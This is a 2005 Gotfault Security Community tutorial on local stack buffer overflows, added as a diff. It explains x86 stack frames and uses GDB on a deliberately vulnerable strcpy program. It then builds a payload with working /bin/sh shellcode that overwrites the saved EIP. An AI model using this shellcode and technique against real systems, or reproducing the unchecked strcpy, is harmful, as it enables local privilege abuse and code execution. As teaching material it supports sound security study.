@@ -1,0 +1,1007 @@
+                        Gotfault Security Community
+                                  (GSC)
+ 
+
+---------[ Chapter : 0x100                                ]
+---------[ Subject : Introduction to Local Stack Overflow ]
+---------[ Author  : xgc/dx A.K.A Thyago Silva            ]
+---------[ Date    : 08/27/2005                           ]
+---------[ Version : 2.5                                  ]
+ 
+ 
+|=-----------------------------------------------------------------------------=|
+ 
+---------[ Table of Contents ]
+ 
+  0x110 - Objective
+  0x120 - Requisites
+  0x130 - Introduction to Gotfault Sharing Knowledge (GSK)
+  0x140 - Introduction to Buffer Overflow
+  0x150 - Memory Sections
+  0x160 - Function Calls Process (FCP)
+  0x170 - Main Registers of the Stack
+  0x180 - Introduction to the Stack Frame
+  0x190 - Analysis of Vulnerable Source Code
+  0x1a0 - Getting Start: Overflowing/Controlling/Executing
+  0x1b0 - Conclusion
+ 
+|=-----------------------------------------------------------------------------=|
+ 
+ 
+---------[ 0x110 - Objective ]
+ 
+Get basic knowledge of memory analysis and be able to control his flow to execute
+arbitrary code.
+ 
+ 
+---------[ 0x120 - Requisites ]
+ 
+Basic knowledge of C/PERL programming.
+ 
+ 
+---------[ 0x130 - Introduction to Gotfault Sharing Knowledge (GSK) ]
+ 
+GSK was created to interested users on programming security to discuss 
+about exploitation techniques under stuff of the selected subject.
+The main goal consists on users to share knowledge with each one.
+I'll try to pass detailed informations of the selected subject, giving
+the chance to users that are just starting. All kind of users are welcome.
+
+ 
+---------[ 0x140 - Introduction to Buffer Overflow ]
+ 
+The principle of exploiting a buffer overflow is to overwrite parts of
+memory which aren't supposed to be overwritten by arbitrary input and
+making the process execute this code. To see how and where an overflow
+takes place, lets take a look at how memory is organized.
+ 
+ 
+---------[ 0x150 - Memory Sections ]
+ 
+The processes memory consists of three sections:
+ 
+ - Code segment:  Data, in this segment, are assembler instructions that
+                  the processor executes. The code execution is non-linear,
+                  it can skip code, jump, and call functions on certain
+                  conditions. Therefore, we have a pointer called EIP, or
+                  instruction pointer. The address where EIP points to 
+                  always contains the code that will be executed next.
+ 
+ - Data segment:  Space for variables and static/dynamic buffers.
+ 
+ - Stack segment: Which is used to pass data(arguments) to functions
+                  and as a space for variables of functions. The bottom(start)
+                  of the stack usually resides at the very end of the virtual
+                  memory of a page, and grows down. The assembler command PUSHL
+                  will add to the top of the stack, and POPL will remove one item
+                  from the top of the stack and put it in a register.
+ 
+Process Memory Layout:
+ 
+ 
+0xc0000000 ---------------------
+           |                   |
+           | env/argv pointer. |
+           |       argc        |
+           |-------------------|
+           |                   |
+           |      stack        |
+           |                   |
+           |        |          |
+           |        |          |
+           |        V          |
+           /                   /
+           \                   \
+           |                   |
+           |        ^          |
+           |        |          |
+           |        |          |
+           |                   |
+           |       heap        |
+           |-------------------|
+           |        bss        |
+           |-------------------|
+           | initialized data  |
+           |-------------------|
+           |       text        |
+           |-------------------|
+           | shared libraries  |
+           |        etc.       |
+0x8000000  |-------------------|
+ 
+ 
+---------[ 0x160 - Function Calls Process (FCP) ]
+ 
+On a Unix system, a function call may be broken up in three steps:
+ 
+ - Prolog   : The current frame pointer(EBP register) is saved. A frame can be viewed
+              as a logical unit of the stack, and contains all the elements
+              related to a function. The amount of memory which is necessary
+              for the function is reserved.
+ 
+ - Call     : The function parameters are stored in the stack and the instruction 
+              pointer(EIP register) is saved, in order to know which instruction must be 
+              considered when the function returns.
+ 
+ - Epilog   : The old stack state is restored(Return).
+ 
+ 
+---------[ 0x170 - Main Registers of the Stack ]
+ 
+The following registers are important in operation of the stack:
+ 
+ EIP - The extended instruction pointer. When you call a function, this
+       pointer is saved on the stack for later use. When the function returns,
+       this saved address is used to determine the location of the next executed
+       instruction.
+ 
+ ESP - The extended stack pointer. This points to the current position
+       on the stack and allows things to be added to and removed from the
+       stack using push and pop operations or direct stack pointer manipulations.
+ 
+ EBP - The extended base pointer. This register usually stays the same
+       throughout the execution of a function. It serves as a static point for
+       referencing stack-based information such as variables and data in a
+       function using offsets. This pointer usually points to the top of the stack
+       for a function.
+ 
+ 
+---------[ 0x180 - Introduction to the Stack Frame ]
+ 
+A stack frame is the name given the entire stack section used by a given function,
+including all the passed arguments, the saved EIP and potentially any other saved
+registers as EBP, and the local function variables. Previously we focused on the
+stack.s use in holding local variables; now we will go into the *bigger picture*
+of the stack.
+ 
+To understand how the stack works in the real, we need some understanding
+of the Intel CALL and RET instructions.
+ 
+The CALL instruction makes functions possible. The purpose of this instruction 
+is to divert processor control to a different part of code while remembering 
+where you need to return. To get this goal, a CALL instruction operates like this:
+ 
+ -  Push address of the next instruction after the call onto the stack. (This
+    is where the processor will return to after executing the function)
+ -  Jump to the address specified by the call.
+ 
+The RET instruction does the opposite. Its purpose is to return from a
+called function to whatever was right after the CALL instruction. The RET
+instruction operates like this:
+ 
+ - Pop the stored return address off the stack.
+ - Jump to the address popped off the stack.
+ 
+This combination allows code to be jumped to and returned from very
+easily, without restricting the nesting of function calls too much.
+ 
+ 
+---------[ 0x190 - Analysis of Vulnerable Source Code ]
+ 
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+ 
+int bof(char *string) {
+ 
+  char buffer[256];
+ 
+  strcpy(buffer, string);
+ 
+  return 1;
+}
+ 
+int main(int argc, char *argv[]) {
+ 
+  bof(argv[1]);
+  printf("Not gonna do it!\n");
+ 
+  return 1;
+}
+ 
+We'll now check this source code following all flow of memory to demostrate
+what happen with registers and stack area. After all we'll be able to exploit 
+and execute any code.
+ 
+Let's see instructions inside main function with gdb.
+
+[xgc@trapdown:~]$ gcc --version
+gcc (GCC) 3.3.5 (Debian 1:3.3.5-13)
+Copyright (C) 2003 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ 
+[xgc@trapdown:~]$ gcc -o simple_stack simple_stack.c
+[xgc@trapdown:~]$ gdb ./simple_stack -q
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x080483e9 <main+0>:    push   %ebp
+0x080483ea <main+1>:    mov    %esp,%ebp
+0x080483ec <main+3>:    sub    $0x8,%esp
+0x080483ef <main+6>:    and    $0xfffffff0,%esp
+0x080483f2 <main+9>:    mov    $0x0,%eax
+0x080483f7 <main+14>:   sub    %eax,%esp
+0x080483f9 <main+16>:   mov    0xc(%ebp),%eax
+0x080483fc <main+19>:   add    $0x4,%eax
+0x080483ff <main+22>:   mov    (%eax),%eax
+0x08048401 <main+24>:   mov    %eax,(%esp)
+0x08048404 <main+27>:   call   0x80483c4 <bof>
+0x08048409 <main+32>:   movl   $0x8048534,(%esp)
+0x08048410 <main+39>:   call   0x80482d8 <_init+56>
+0x08048415 <main+44>:   mov    $0x1,%eax
+0x0804841a <main+49>:   leave
+0x0804841b <main+50>:   ret
+0x0804841c <main+51>:   nop
+0x0804841d <main+52>:   nop
+0x0804841e <main+53>:   nop
+0x0804841f <main+54>:   nop
+End of assembler dump.
+(gdb)
+ 
+I'll explain now what happen with each line.
+ 
+0x080483e9 <main+0>:    push   %ebp
+0x080483ea <main+1>:    mov    %esp,%ebp
+0x080483ec <main+3>:    sub    $0x8,%esp
+ 
+It's a PROLOG.
+First, EIP is saved from the function _init (or _start), that initialize 
+this program, which called main().
+Old frame pointer is saved(%ebp) and does, from current stack pointer(esp),
+the new frame pointer(mov %esp, %ebp).
+After gcc-2.9.6 dummy bytes is always set free at functions, in this case 
+0x08 bytes.
+It's the default process that any function does. 
+ 
+Process Layout at this moment looks like:
+ 
+      |-------------------| --------------------------------+
+      | saved EIP         | - from caller(_start) of main() |
+      |-------------------|                                 |
+      | saved EBP         | - from caller(_start) of main() |
+      |-------------------|                                 |
+      | 0x08 dummy        |   NEW STACK FRAME               |
+      |-------------------| --------------------------------+
+ 
+0x080483f9 <main+16>:   mov    0xc(%ebp),%eax
+0x080483fc <main+19>:   add    $0x4,%eax
+0x080483ff <main+22>:   mov    (%eax),%eax
+0x08048401 <main+24>:   mov    %eax,(%esp)
+0x08048404 <main+27>:   call   0x80483c4 <bof>
+ 
+At line main+16, 0xc(%ebp) is moved to EAX register.
+This address is vector from argv.
+At line main+19, is argv[1] set at EAX register.
+At line main+22, argv[1] as pointer, it gets what argv[1] is pointing to.
+At line main+24, all content of argv[1] is being moved to stack pointer(%esp).
+At line main+27, bof function call is done. Its parameters are piled 
+(in reverse order) and the function is invoked.
+ 
+Process Layout at this moment looks like:
+ 
+      |-------------------| --------------------------------+
+      | saved EIP         | - from caller(_start) of main() |
+      |-------------------|                                 |
+      | saved EBP         | - from caller(_start) of main() |
+      |-------------------|                                 |
+      | 0x08 dummy        |   NEW STACK FRAME               |
+      |-------------------| --------------------------------+
+      | bof(argv[1])      |
+      |-------------------| 
+ 
+0x08048409 <main+32>:   movl   $0x8048534,(%esp)
+0x08048410 <main+39>:   call   0x80482d8 <_init+56>
+0x08048415 <main+44>:   mov    $0x1,%eax
+ 
+Well, at line main+32, address(0x8048534) of string "Not gonna do it!\n" is 
+moved to stack pointer(%esp) and then printf(), at line main+39, is called 
+with his argument passed. The instruction mov $0x1, %eax is for return 1.
+ 
+Process Layout at this moment looks like:
+ 
+      |-------------------| --------------------------------+
+      | saved EIP         | - from caller(_start) of main() |
+      |-------------------|                                 |
+      | saved EBP         | - from caller(_start) of main() |
+      |-------------------|                                 |
+      | 0x08 dummy        |   NEW STACK FRAME               |
+      |-------------------| --------------------------------+
+      | bof(argv[1])      |
+      |-------------------| 
+      | printf()          |
+      |-------------------| 
+      | return 1;         |
+      |-------------------| 
+ 
+0x0804841a <main+49>:   leave
+0x0804841b <main+50>:   ret
+
+It's a Epilog.
+At line main+49, is the leave instruction that does:
+ 
+mov %ebp, %esp <- restores EBP(old frame from _start function).
+pop %ebp       <- take off EBP from ESP(old frame) and loads at %ebp (EBP saved at main). 
+ 
+At line main+50, RET instruction gets what %esp is pointing to and loads, at EIP
+register, this pointed address, so, this address will be executed.
+ 
+Process Layout at this moment looks like:
+                        
+      |--------------------| --------------------------------+
+      | saved EIP          | - from caller(_start) of main() |
+      |--------------------|                                 |
+      | saved EBP          | - from caller(_start) of main() |
+      |--------------------|                                 |
+      | 0x08 dummy         |   NEW STACK FRAME               |
+      |--------------------| --------------------------------+
+      | bof(argv[1])       |
+      |--------------------| 
+      | printf()           |
+      |--------------------| 
+      | return 1;          |
+      |--------------------| 
+      | mov %ebp, %esp     | ---+
+      |--------------------|    | - leave instruction
+      | pop %ebp           | ---+
+      |--------------------|  
+      | ret gets (%esp)    | ---+
+      |--------------------|    | - ret instruction
+      | loads (%esp) @ EIP | ---+
+      |--------------------|
+ 
+Now, let's see instructions inside bof function with GDB.
+ 
+(gdb) disassemble bof
+Dump of assembler code for function bof:
+0x080483c4 <bof+0>:     push   %ebp
+0x080483c5 <bof+1>:     mov    %esp,%ebp
+0x080483c7 <bof+3>:     sub    $0x118,%esp
+0x080483cd <bof+9>:     mov    0x8(%ebp),%eax
+0x080483d0 <bof+12>:    mov    %eax,0x4(%esp)
+0x080483d4 <bof+16>:    lea    0xfffffef8(%ebp),%eax
+0x080483da <bof+22>:    mov    %eax,(%esp)
+0x080483dd <bof+25>:    call   0x80482e8 <_init+72>
+0x080483e2 <bof+30>:    mov    $0x1,%eax
+0x080483e7 <bof+35>:    leave
+0x080483e8 <bof+36>:    ret
+End of assembler dump.
+(gdb)
+ 
+0x080483c4 <bof+0>:     push   %ebp
+0x080483c5 <bof+1>:     mov    %esp,%ebp
+0x080483c7 <bof+3>:     sub    $0x118,%esp
+ 
+It's a Prolog. 
+Again, first, EIP is saved from the main function, that call bof function.
+Old frame pointer is saved(%ebp) and does, from current stack pointer(ESP),
+the new frame pointer(mov %esp, %ebp).
+0x118 bytes are available for local variable buffer.
+ 
+Process Layout at this moment looks like:
+ 
+0xbfffffff                       
+     +----> |-------------------| --------------------------------+
+     |      | char *string      |  bof()                          |
+     |      |                   |                                 |
+     |      |-------------------|                                 |
+     |      | saved EIP         | - from caller(main) of bof()    |
+     |      |-------------------|                                 |
+     |      | saved EBP         | - from caller(main) of bof()    |
+     |      |-------------------|                                 |
+     |      | 0x118b @ buffer[] |   NEW STACK FRAME               |
+     |      |-------------------| --------------------------------+
+     |      |                   |
+     |      |-------------------|
+     |      | .text             |
+     |      |-------------------|
+     +----  | call bof() @ main |
+0x08040000  |-------------------|
+            |                   |
+            |-------------------|
+            | shared libraries  |
+0x08000000  |-------------------|
+ 
+ 
+0x080483cd <bof+9>:     mov    0x8(%ebp),%eax
+0x080483d0 <bof+12>:    mov    %eax,0x4(%esp)
+0x080483d4 <bof+16>:    lea    0xfffffef8(%ebp),%eax
+0x080483da <bof+22>:    mov    %eax,(%esp)
+0x080483dd <bof+25>:    call   0x80482e8 <_init+72>
+ 
+Function strcpy requires two arguments, the first one is buffer to alocate the second
+argument, in this case argv[1]. So, at line bof+9 0x8(%ebp)(argv[1]) is moved to EAX
+and at line bof+12, EAX is moved to 0x4(%esp). After, LEA instruction is activated.
+LEA does: loads the efective address from 0xfffffef8(%ebp) to EAX. The difference
+of LEA to MOV is that LEA loads address from somewhere to some register and MOV copies
+the content of address from somewhere to some register.
+ 
+Process Layout at this moment looks like:
+ 
+0xbfffffff                       
+     +----> |-------------------| --------------------------------+
+     |      | char *string      |  bof()                          |
+     |      |                   |                                 |
+     |      |-------------------|                                 |
+     |      | saved EIP         | - from caller(main) of bof()    |
+     |      |-------------------|                                 |
+     |      | saved EBP         | - from caller(main) of bof()    |
+     |      |-------------------|                                 |
+     |      | 0x118b @ buffer[] |   NEW STACK FRAME               |
+     |      |-------------------| --------------------------------+
+     |      | strcpy()          |
+     |      |-------------------|
+     |      |                   |
+     |      |-------------------|
+     |      | .text             |
+     |      |-------------------|
+     +----  | call bof() @ main |
+0x08040000  |-------------------|
+            |                   |
+            |-------------------|
+            | shared libraries  |
+0x08000000  |-------------------|
+ 
+0x080483e7 <bof+35>:    leave
+0x080483e8 <bof+36>:    ret
+ 
+It's a Epilog.
+Again, at line bof+35, is the LEAVE instruction that does:
+ 
+mov %ebp, %esp <- restores EBP(old frame from main function).
+pop %ebp       <- take off EBP from ESP(old frame) and loads at %ebp (EBP saved at bof). 
+ 
+At line bof+36, RET instruction gets what %esp is pointing to and loads, at EIP
+register, this pointed address, so, this address will be executed when returns
+to main fucntion and will follow the normal flow even main finishs.
+ 
+Process Layout at this moment looks like:
+ 
+0xbfffffff                       
+     +----> |--------------------| --------------------------------+
+     |      | char *string       |  bof()                          |
+     |      |                    |                                 |
+     |      |--------------------|                                 |
+     |      | saved EIP          | - from caller(main) of bof()    |
+     |      |--------------------|                                 |
+     |      | saved EBP          | - from caller(main) of bof()    |
+     |      |--------------------|                                 |
+     |      | 0x118b @ buffer[]  |   NEW STACK FRAME               |
+     |      |--------------------| --------------------------------+
+     |      | strcpy()           |
+     |      |--------------------|
+     |      | return 1;          |
+     |      |--------------------|
+     |      | mov %ebp,%esp      | ---+
+     |      |--------------------|    | - leave instruction
+     |      | pop %ebp           | ---+
+     |      |--------------------|  
+     |      | ret gets (%esp)    | ---+
+     |      |--------------------|    | - ret instruction
+     |      | loads (%esp) @ EIP | ---+
+     |      |--------------------|
+     |      |                    |
+     |      |--------------------|
+     |      | .text              |
+     |      |--------------------|
+     +----  | call bof() @ main  |
+0x08040000  |--------------------|
+            |                    |
+            |--------------------|
+            | shared libraries   |
+0x08000000  |--------------------|
+ 
+Let's check execution of the program at gdb.
+ 
+[xgc@trapdown:~]$ gdb ./simple_stack -q
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x080483e9 <main+0>:    push   %ebp
+0x080483ea <main+1>:    mov    %esp,%ebp
+0x080483ec <main+3>:    sub    $0x8,%esp
+0x080483ef <main+6>:    and    $0xfffffff0,%esp
+0x080483f2 <main+9>:    mov    $0x0,%eax
+0x080483f7 <main+14>:   sub    %eax,%esp
+0x080483f9 <main+16>:   mov    0xc(%ebp),%eax
+0x080483fc <main+19>:   add    $0x4,%eax
+0x080483ff <main+22>:   mov    (%eax),%eax
+0x08048401 <main+24>:   mov    %eax,(%esp)
+0x08048404 <main+27>:   call   0x80483c4 <bof>
+0x08048409 <main+32>:   movl   $0x8048534,(%esp)
+0x08048410 <main+39>:   call   0x80482d8 <_init+56>
+0x08048415 <main+44>:   mov    $0x1,%eax
+0x0804841a <main+49>:   leave
+0x0804841b <main+50>:   ret
+0x0804841c <main+51>:   nop
+0x0804841d <main+52>:   nop
+0x0804841e <main+53>:   nop
+0x0804841f <main+54>:   nop
+End of assembler dump.
+(gdb) break *main+24
+Breakpoint 1 at 0x8048401
+(gdb) run testing...
+Starting program: /home/xgc/simple_stack testing...
+ 
+Breakpoint 1, 0x08048401 in main ()
+(gdb) x/x $esp+0x04
+0xbffffb24:     0xbffffb84
+(gdb) x/x 0xbffffb84
+0xbffffb84:     0xbffffc60
+(gdb) x/s 0xbffffc60
+0xbffffc60:      "/home/xgc/simple_stack"
+(gdb)
+0xbffffc77:      "testing..."
+(gdb)
+ 
+As I said about the process to load argv[1] into the stack.
+At $esp+0x4 stands argv[0].
+ 
+(gdb) d 1
+(gdb) break *main+27
+Breakpoint 2 at 0x8048404
+(gdb) disassemble bof
+Dump of assembler code for function bof:
+0x080483c4 <bof+0>:     push   %ebp
+0x080483c5 <bof+1>:     mov    %esp,%ebp
+0x080483c7 <bof+3>:     sub    $0x118,%esp
+0x080483cd <bof+9>:     mov    0x8(%ebp),%eax
+0x080483d0 <bof+12>:    mov    %eax,0x4(%esp)
+0x080483d4 <bof+16>:    lea    0xfffffef8(%ebp),%eax
+0x080483da <bof+22>:    mov    %eax,(%esp)
+0x080483dd <bof+25>:    call   0x80482e8 <_init+72>
+0x080483e2 <bof+30>:    mov    $0x1,%eax
+0x080483e7 <bof+35>:    leave
+0x080483e8 <bof+36>:    ret
+End of assembler dump.
+(gdb)
+ 
+At bof function we can see a problem with strcpy function.
+The function strcpy() does not check its boundaries, that means
+that it does not check if argv[1] fits into buffer, and just keeps
+on copying into buffer until it encounters a NULL string (\0).
+ 
+ 
+---------[ 0x1a0 - Getting Start: Overflowing/Controlling/Executing ]
+ 
+Let's fill the buffer more than it supports.
+ 
+(gdb) run `perl -e 'print "A"x264,"BBBB"'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+ 
+Starting program: /home/xgc/simple_stack `perl -e 'print "A"x264,"BBBB"'`
+ 
+Breakpoint 2, 0x08048404 in main ()
+(gdb) c
+Continuing.
+ 
+Program received signal SIGSEGV, Segmentation fault.
+0x08048400 in main ()
+(gdb) i r ebp
+ebp            0x42424242       0x42424242
+(gdb)
+ 
+Now let's see what happen before segmentation fault:
+ 
+(gdb) disassemble bof
+Dump of assembler code for function bof:
+0x080483c4 <bof+0>:     push   %ebp
+0x080483c5 <bof+1>:     mov    %esp,%ebp
+0x080483c7 <bof+3>:     sub    $0x118,%esp
+0x080483cd <bof+9>:     mov    0x8(%ebp),%eax
+0x080483d0 <bof+12>:    mov    %eax,0x4(%esp)
+0x080483d4 <bof+16>:    lea    0xfffffef8(%ebp),%eax
+0x080483da <bof+22>:    mov    %eax,(%esp)
+0x080483dd <bof+25>:    call   0x80482e8 <_init+72>
+0x080483e2 <bof+30>:    mov    $0x1,%eax
+0x080483e7 <bof+35>:    leave
+0x080483e8 <bof+36>:    ret
+End of assembler dump.
+(gdb) break *bof+35
+Breakpoint 1 at 0x80483e7
+(gdb) display/1i $eip
+(gdb) run `perl -e 'print "A" x 264, "BBBB"'`
+Starting program: /home/xgc/simple_stack `perl -e 'print "A" x 264, "BBBB"'`
+ 
+Breakpoint 1, 0x080483e7 in bof ()
+1: x/i $eip  0x80483e7 <bof+35>:        leave
+(gdb) i r ebp
+ebp            0xbffffa18       0xbffffa18
+(gdb) stepi
+0x080483e8 in bof ()
+1: x/i $eip  0x80483e8 <bof+36>:        ret
+(gdb) i r ebp
+ebp            0x42424242       0x42424242
+(gdb)
+ 
+EBP was overwritten. Segmentation fault have been ocurred at RET, of bof
+function, that got what %esp is pointing(leave instruction) to and puts at 
+eip register this pointed address. Check out process layout after EBP controlled:
+ 
+0xbfffffff                       
+     +----> |-----------------------| --------------------------------+
+     |      | char *string          |  bof()                          |
+     |      |                       |                                 |
+     |      |-----------------------|                                 |
+     |      | saved EIP             | - from caller(main) of bof()    |
+     |      |-----------------------|                                 |
+     |      | saved EBP(0x42424242) | - from caller(main) of bof()    |
+     |      |-----------------------|                                 |
+     |      | 0x118b @ buffer[]     |   NEW STACK FRAME               |
+     |      |-----------------------| --------------------------------+
+     |      | strcpy()              |
+     |      |-----------------------|
+     |      | return 1;             |
+     |      |-----------------------|
+     |      | mov %ebp, %esp        | ---+
+     |      |-----------------------|    | - leave instruction
+     |      | pop %ebp              | ---+
+     |      |-----------------------|  
+     |      | ret gets (%esp)       | ---+
+     |      |-----------------------|    | - ret instruction
+     |      | loads (%esp) @ EIP    | ---+
+     |      |-----------------------|
+     |      |                       |
+     |      |-----------------------|
+     |      | .text                 |
+     |      |-----------------------|
+     +----  | call bof() @ main     |
+0x08040000  |-----------------------|
+            |                       |
+            |-----------------------|
+            | shared libraries      |
+0x08000000  |-----------------------|
+ 
+Let's add more four bytes and run the program again.
+ 
+(gdb) run `perl -e 'print "A"x264,"BBBB","CCCC"'`
+Starting program: /home/xgc/simple_stack `perl -e 'print "A"x264,"BBBB","CCCC"'`
+ 
+Breakpoint 2, 0x08048404 in main ()
+(gdb) c
+Continuing.
+ 
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+(gdb) i r ebp eip
+ebp            0x42424242       0x42424242
+eip            0x43434343       0x43434343
+(gdb) 
+ 
+Now let's see what happen before segmentation fault:
+ 
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x080483e9 <main+0>:    push   %ebp
+0x080483ea <main+1>:    mov    %esp,%ebp
+0x080483ec <main+3>:    sub    $0x8,%esp
+0x080483ef <main+6>:    and    $0xfffffff0,%esp
+0x080483f2 <main+9>:    mov    $0x0,%eax
+0x080483f7 <main+14>:   sub    %eax,%esp
+0x080483f9 <main+16>:   mov    0xc(%ebp),%eax
+0x080483fc <main+19>:   add    $0x4,%eax
+0x080483ff <main+22>:   mov    (%eax),%eax
+0x08048401 <main+24>:   mov    %eax,(%esp)
+0x08048404 <main+27>:   call   0x80483c4 <bof>
+0x08048409 <main+32>:   movl   $0x8048534,(%esp)
+0x08048410 <main+39>:   call   0x80482d8 <_init+56>
+0x08048415 <main+44>:   mov    $0x1,%eax
+0x0804841a <main+49>:   leave
+0x0804841b <main+50>:   ret
+0x0804841c <main+51>:   nop
+0x0804841d <main+52>:   nop
+0x0804841e <main+53>:   nop
+0x0804841f <main+54>:   nop
+End of assembler dump.
+(gdb) break *main+44
+Breakpoint 1 at 0x8048415
+(gdb) disassemble bof
+Dump of assembler code for function bof:
+0x080483c4 <bof+0>:     push   %ebp
+0x080483c5 <bof+1>:     mov    %esp,%ebp
+0x080483c7 <bof+3>:     sub    $0x118,%esp
+0x080483cd <bof+9>:     mov    0x8(%ebp),%eax
+0x080483d0 <bof+12>:    mov    %eax,0x4(%esp)
+0x080483d4 <bof+16>:    lea    0xfffffef8(%ebp),%eax
+0x080483da <bof+22>:    mov    %eax,(%esp)
+0x080483dd <bof+25>:    call   0x80482e8 <_init+72>
+0x080483e2 <bof+30>:    mov    $0x1,%eax
+0x080483e7 <bof+35>:    leave
+0x080483e8 <bof+36>:    ret
+End of assembler dump.
+(gdb) break *bof+35
+Breakpoint 2 at 0x80483e7
+(gdb) display/1i $eip
+(gdb) run `perl -e 'print "A" x 264, "BBBB","CCCC"'`
+Starting program: /home/xgc/simple_stack `perl -e 'print "A" x 264, "BBBB","CCCC"'`
+ 
+Breakpoint 2, 0x080483e7 in bof ()
+1: x/i $eip  0x80483e7 <bof+35>:        leave
+(gdb) i r ebp eip
+ebp            0xbffffa18       0xbffffa18
+eip            0x80483e7        0x80483e7
+(gdb) stepi
+0x080483e8 in bof ()
+1: x/i $eip  0x80483e8 <bof+36>:        ret
+(gdb) i r ebp eip
+ebp            0x42424242       0x42424242
+eip            0x80483e8        0x80483e8
+(gdb) stepi
+0x43434343 in ?? ()
+1: x/i $eip  0x43434343:        add    %al,(%eax)
+(gdb) i r ebp eip
+ebp            0x42424242       0x42424242
+eip            0x43434343       0x43434343
+(gdb)
+ 
+EBP and EIP were overwritten. Segmentation fault have been ocurred at RET, of bof
+function, that got what %esp is pointing to and puts at eip register this pointed
+address, when it Returns to main function Check out process layout after EIP
+and EBP controlled:
+ 
+0xbfffffff                       
+     +----> |-----------------------| --------------------------------+
+     |      | char *string          |  bof()                          |
+     |      |                       |                                 |
+     |      |-----------------------|                                 |
+     |      | saved EIP(0x43434343) | - from caller(main) of bof()    |
+     |      |-----------------------|                                 |
+     |      | saved EBP(0x42424242) | - from caller(main) of bof()    |
+     |      |-----------------------|                                 |
+     |      | 0x118b @ buffer[]     |   NEW STACK FRAME               |
+     |      |-----------------------| --------------------------------+
+     |      | strcpy()              |
+     |      |-----------------------|
+     |      | return 1;             |
+     |      |-----------------------|
+     |      | mov %ebp,%esp         | ---+
+     |      |-----------------------|    | - leave instruction
+     |      | pop %ebp              | ---+
+     |      |-----------------------|  
+     |      | ret gets (%esp)       | ---+
+     |      |-----------------------|    | - ret instruction
+     |      | loads (%esp) @ EIP    | ---+
+     |      |-----------------------|
+     |      |                       |
+     |      |-----------------------|
+     |      | .text                 |
+     |      |-----------------------|
+     +----  | call bof() @ main     |
+0x08040000  |-----------------------|
+            |                       |
+            |-----------------------|
+            | shared libraries      |
+0x08000000  |-----------------------|
+ 
+EIP controlled means that we can now jump to anywhere or execute any instruction
+or any code. Our goal here is inject shellcode at stack memory and makes EIP jumps 
+to there to execute /bin/sh. Let's restart the process at GDB.
+ 
+[xgc@trapdown:~]$ gdb ./simple_stack -q
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) break *main+27
+Breakpoint 1 at 0x8048404
+(gdb) display/1i $eip
+(gdb) run `perl -e 'print "A"x264,"BBBB","CCCC"'`
+Starting program: /home/xgc/simple_stack `perl -e 'print "A"x264,"BBBB","CCCC"'`
+ 
+Breakpoint 1, 0x08048404 in main ()
+1: x/i $eip  0x8048404 <main+27>:       call   0x80483c4 <bof>
+(gdb) c
+Continuing.
+ 
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+1: x/i $eip  0x43434343:        add    %al,(%eax)
+(gdb)
+ 
+First, we've break at call of bof function just to debug.
+I've also set one display to watch EIP as ASM Instruction format and
+after we continue to leave the break. Getting informations about main registers
+we can see that EBP and EIP were controlled by us. Our code to execute will be 
+called by shellcode. But try to figure out, to overwrite EIP we filled the buffer
+with 272 bytes. So our malicious buffer will looks like:
+ 
+[################] + [SHELLCODE] + [CCCC] = 272 bytes.
+ 
+[################] = Garbage
+[SHELLCODE]        = Code to execute /bin/sh
+[CCCC]             = Bytes to overwrite EIP
+------------------ = 272 bytes.
+ 
+We'll use this follow shellcode:
+ 
+"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3"
+"\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+ 
+This shellcode have 24 bytes and executes /bin/sh.
+ 
+[################] = Garbage                  - 244 bytes
+[SHELLCODE]        = Code to execute /bin/sh  -  24 bytes
+[CCCC]             = Bytes to overwrite EIP   -   4 bytes
+------------------ = 272 bytes.
+ 
+Now we'll back to GDB and build our malicious buffer.
+ 
+(gdb) run `perl -e 'print "A"x244,"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53
+\x89\xe1\x99\xb0\x0b\xcd\x80","CCCC" '`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+ 
+Starting program: /home/xgc/simple_stack `perl -e 'print "A"x244,"\x31\xc0\x50\x68
+//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80","CCCC"'`
+ 
+Breakpoint 1, 0x08048404 in main ()
+1: x/i $eip  0x8048404 <main+27>:       call   0x80483c4 <bof>
+(gdb) c
+Continuing.
+ 
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+1: x/i $eip  0x43434343:        add    %al,(%eax)
+(gdb) i r eip
+eip            0x43434343       0x43434343
+(gdb)
+ 
+As we can see, theory works and EIP still controlled by us.
+Well, the 4 bytes to control EIP must be replaced by the address of shellcode at ESP.
+After replaced "CCCC" by the address of shellcode (as we said before, will points 
+to the next instruction), shellcode will be executed. All processs looks like:
+ 
+                           +-------------+ 
+                           |             |
+                           v             |
+[################] + [SHELLCODE] + [&SHELLCODE] = 272 bytes.
+                                      (EIP)
+ 
+To get address of this shellcode at stack memory we can do a direct jump
+to begin of shellcode instructions or use NOP bytes.
+ 
+For direct jump method we need to check where shellcode instructions starts at stack
+memory. Let's see:
+ 
+(gdb) x/128xb $esp
+          .
+          .
+          .
+0xbffffc48:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffffc50:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffffc58:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffffc60:     0x41    0x41    0x41    0x41    0x31    0xc0    0x50    0x68
+0xbffffc68:     0x2f    0x2f    0x73    0x68    0x68    0x2f    0x62    0x69
+0xbffffc70:     0x6e    0x89    0xe3    0x50    0x53    0x89    0xe1    0x99
+0xbffffc78:     0xb0    0x0b    0xcd    0x80    0x43    0x43    0x43    0x43
+ 
+We can see part of our A's and following the shellcode and to finishs "CCCC".
+So, shellcode address is at 0xbffffc64.
+Now we need to add this address inside of our malicious buffer, in little endian 
+format, and re-execute the program.
+ 
